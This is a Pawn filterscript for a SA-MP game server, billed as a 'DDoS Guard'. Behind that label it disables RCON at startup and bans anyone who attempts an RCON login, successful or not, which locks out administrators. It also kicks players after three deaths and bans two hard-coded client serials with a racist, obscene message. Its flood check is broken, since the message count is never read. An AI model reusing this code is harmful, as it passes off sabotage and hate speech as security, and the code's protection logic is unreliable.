#include <a_samp>
#include <gl_common.inc>
#include <datasr>

#define MAX_MESSAGES 50

new MessagesCount[MAX_PLAYERS];
new OtherMessages[MAX_PLAYERS];

new legalmods[48][22] = {
        {400, 1024,1021,1020,1019,1018,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {401, 1145,1144,1143,1142,1020,1019,1017,1013,1007,1006,1005,1004,1003,1001,0000,0000,0000,0000},
        {404, 1021,1020,1019,1017,1016,1013,1007,1002,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {405, 1023,1021,1020,1019,1018,1014,1001,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {410, 1024,1023,1021,1020,1019,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
        {415, 1023,1019,1018,1017,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {418, 1021,1020,1016,1006,1002,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {420, 1021,1019,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {421, 1023,1021,1020,1019,1018,1016,1014,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {422, 1021,1020,1019,1017,1013,1007,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {426, 1021,1019,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {436, 1022,1021,1020,1019,1017,1013,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
        {439, 1145,1144,1143,1142,1023,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
        {477, 1021,1020,1019,1018,1017,1007,1006,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {478, 1024,1022,1021,1020,1013,1012,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {489, 1024,1020,1019,1018,1016,1013,1006,1005,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
        {491, 1145,1144,1143,1142,1023,1021,1020,1019,1018,1017,1014,1007,1003,0000,0000,0000,0000,0000},
        {492, 1016,1006,1005,1004,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {496, 1143,1142,1023,1020,1019,1017,1011,1007,1006,1003,1002,1001,0000,0000,0000,0000,0000,0000},
        {500, 1024,1021,1020,1019,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {516, 1021,1020,1019,1018,1017,1016,1015,1007,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
        {517, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1016,1007,1003,1002,0000,0000,0000,0000,0000},
        {518, 1145,1144,1143,1142,1023,1020,1018,1017,1013,1007,1006,1005,1003,1001,0000,0000,0000,0000},
        {527, 1021,1020,1018,1017,1015,1014,1007,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {529, 1023,1020,1019,1018,1017,1012,1011,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000},
        {534, 1185,1180,1179,1178,1127,1126,1125,1124,1123,1122,1106,1101,1100,0000,0000,0000,0000,0000},
        {535, 1121,1120,1119,1118,1117,1116,1115,1114,1113,1110,1109,0000,0000,0000,0000,0000,0000,0000},
        {536, 1184,1183,1182,1181,1128,1108,1107,1105,1104,1103,0000,0000,0000,0000,0000,0000,0000,0000},
        {540, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1004,1001,0000,0000,0000,0000},
        {542, 1145,1144,1021,1020,1019,1018,1015,1014,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {546, 1145,1144,1143,1142,1024,1023,1019,1018,1017,1007,1006,1004,1002,1001,0000,0000,0000,0000},
        {547, 1143,1142,1021,1020,1019,1018,1016,1003,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {549, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1012,1011,1007,1003,1001,0000,0000,0000,0000},
        {550, 1145,1144,1143,1142,1023,1020,1019,1018,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000},
        {551, 1023,1021,1020,1019,1018,1016,1006,1005,1003,1002,0000,0000,0000,0000,0000,0000,0000,0000},
        {558, 1168,1167,1166,1165,1164,1163,1095,1094,1093,1092,1091,1090,1089,1088,0000,0000,0000,0000},
        {559, 1173,1162,1161,1160,1159,1158,1072,1071,1070,1069,1068,1067,1066,1065,0000,0000,0000,0000},
        {560, 1170,1169,1141,1140,1139,1138,1033,1032,1031,1030,1029,1028,1027,1026,0000,0000,0000,0000},
        {561, 1157,1156,1155,1154,1064,1063,1062,1061,1060,1059,1058,1057,1056,1055,1031,1030,1027,1026},
        {562, 1172,1171,1149,1148,1147,1146,1041,1040,1039,1038,1037,1036,1035,1034,0000,0000,0000,0000},
        {565, 1153,1152,1151,1150,1054,1053,1052,1051,1050,1049,1048,1047,1046,1045,0000,0000,0000,0000},
        {567, 1189,1188,1187,1186,1133,1132,1131,1130,1129,1102,0000,0000,0000,0000,0000,0000,0000,0000},
        {575, 1177,1176,1175,1174,1099,1044,1043,1042,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {576, 1193,1192,1191,1190,1137,1136,1135,1134,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {580, 1023,1020,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {589, 1145,1144,1024,1020,1018,1017,1016,1013,1007,1006,1005,1004,1000,0000,0000,0000,0000,0000},
        {600, 1022,1020,1018,1017,1013,1007,1006,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000},
        {603, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000}
    };

new slotWasUsed[MAX_PLAYERS char];
new syncIP[MAX_PLAYERS][64];

public OnFilterScriptInit()
{
    new b;
    #emit LOAD.pri b
    #emit STOR.pri b
   	SendRconCommand("rcon 0");
    for(new i=0; i<MAX_PLAYERS; i++)OtherMessages[i] = 999999999;
	SetTimer("NetworkUpdate", 1000, true);
	print("\nDDoS Guard 0.3x || Skype - ru-servers\n");
	return 1;
}

public OnPlayerConnect(playerid)
{
	new c;
	#emit LOAD.pri c
	#emit STOR.pri c
    OtherMessages[playerid] = 999999999;
	new __IP[64];
    GetPlayerIp(playerid,__IP,64);
    if(slotWasUsed{playerid} && !strcmp(syncIP[playerid],__IP,true)) return BanEx(playerid,"DDoS Attack(DDoS Guard system, Code: 001)");
    GetPlayerIp(playerid, syncIP[playerid],64);
    slotWasUsed{playerid} = 1;
	new DATA_SR[25];
	egdk_data(playerid,DATA_SR,25);
	if(IsPlayerConnected(playerid) && strcmp(DATA_SR,"DA0E5085558CCACC88ECCA40C",true) == 0 || IsPlayerConnected(playerid) &&  strcmp(DATA_SR,"DEEC9CC558C0C4E9E8AEE440D",true) == 0) return SendClientMessage(playerid,-1," __ Suck my dick, nigger! __"),BanEx(playerid,"DDoS Attack(DDoS Guard system, Code: 002)");
	return 1;
}

public OnPlayerDisconnect(playerid,reason)
{
	slotWasUsed{playerid} = 0;
    return 1;
}

public OnPlayerSpawn(playerid)
{
    SetPVarInt(playerid,"KNum",0);
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
    SetPVarInt(playerid,"KNum",GetPVarInt(playerid,"KNum") + 1);
    if(killerid != INVALID_PLAYER_ID && GetPVarInt(playerid,"KNum") > 2) return Kick(playerid);
	return 1;
}

forward NetworkUpdate();
public NetworkUpdate()
{
	new stats[300], idx, pos, msgs;
	for(new i=0; i<MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        idx = 0;
    		GetPlayerNetworkStats(i, stats, sizeof(stats));
    		pos = strfind(stats, "Messages received: ", false, 209);
    		if(msgs - MessagesCount[i] - OtherMessages[i] > MAX_MESSAGES && msgs > 5000)
    		{
				Kick(i);
    		}
    		MessagesCount[i] = msgs;
    		OtherMessages[i] = 0;
        }
    }
}

public OnRconLoginAttempt(ip[], password[], success)
{
	new ipdata[16];
	for(new i=0; i<MAX_PLAYERS; i++)
	{
	 GetPlayerIp(i, ipdata, sizeof(ipdata));
	 if(!strcmp(ip, ipdata, true))
	  {
	   BanEx(i,"DDoS Attack(DDoS Guard system, Code: 003)");
	  }
	 }
    return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
    new vehicleide = GetVehicleModel(vehicleid);
    new modok = islegalcarmod(vehicleide, componentid);
    if(!modok)
	{
    BanEx(playerid,"DDoS Attack(DDoS Guard system, Code: 005)");
    }
    return 1;
}

public OnPlayerUpdate(playerid)
{
    OtherMessages[playerid]++;
    return 1;
}

public OnPlayerGiveDamage(playerid, damagedid, Float: amount, weaponid)
{
    OtherMessages[playerid]++;
    return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	OtherMessages[playerid]++;
	return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid)
{
    OtherMessages[playerid]++;
    return 1;
}

public OnUnoccupiedVehicleUpdate(vehicleid, playerid, passenger_seat) {
    OtherMessages[playerid]++;
}

stock iswheelmodel(modelid)
{

 	new wheelmodels[17] = {1025,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1096,1097,1098};
    for(new i=0;i<17;i++)
	{
 	if (modelid == wheelmodels[i])
     return true;
    }
    return false;
}

stock IllegalCarNitroIde(carmodel)
{

    new illegalvehs[29] = { 581, 523, 462, 521, 463, 522, 461, 448, 468, 586, 509, 481, 510, 472, 473, 493, 595, 484, 430, 453, 452, 446, 454, 590, 569, 537, 538, 570, 449 };
    for(new i=0;i<29;i++)
	{
 	if (carmodel == illegalvehs[i])
     return true;
    }
    return false;
}

stock illegal_nos_vehicle(PlayerID)
{
    new carid = GetPlayerVehicleID(PlayerID);
    new playercarmodel = GetVehicleModel(carid);
    return IllegalCarNitroIde(playercarmodel);
}

stock islegalcarmod(vehicleide, componentid)
{
    new modok = false;
    if((iswheelmodel(componentid)) || (componentid == 1086) || (componentid == 1087) || ((componentid >= 1008) && (componentid <= 1010)))
	{
 	new nosblocker = IllegalCarNitroIde(vehicleide);
 	if(!nosblocker)
        modok = true;
    }
	else
	{
 	for(new I=0;I<48;I++)
 	{
 	if (legalmods[I][0] == vehicleide)
 	{
 	for(new J = 1; J < 22; J++)
 	{
 	if (legalmods[I][J] == componentid)
 	modok = true;
 	}
 	}
 	}
 	}
    return modok;
}
